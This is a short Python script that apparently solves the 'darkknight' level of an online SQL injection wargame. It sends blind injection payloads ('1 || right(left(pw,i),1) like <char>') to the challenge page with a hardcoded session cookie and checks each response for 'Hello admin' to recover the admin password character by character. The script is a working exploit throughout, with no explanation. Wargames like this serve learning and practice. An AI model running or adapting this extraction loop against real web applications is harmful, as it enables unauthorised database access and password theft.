import requests
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="
session = dict(PHPSESSID = "7fg7garrlbfbnvh9cqdlli3i35")

for i in range(1, 9):
    for j in range(33, 128):
        query = url + "1 || right(left(pw," + str(i) + "), 1) like " + chr(j)
        r = requests.post(url = query, cookies = session)

        if "Hello admin" in r.text:
            print(chr(j))
            break
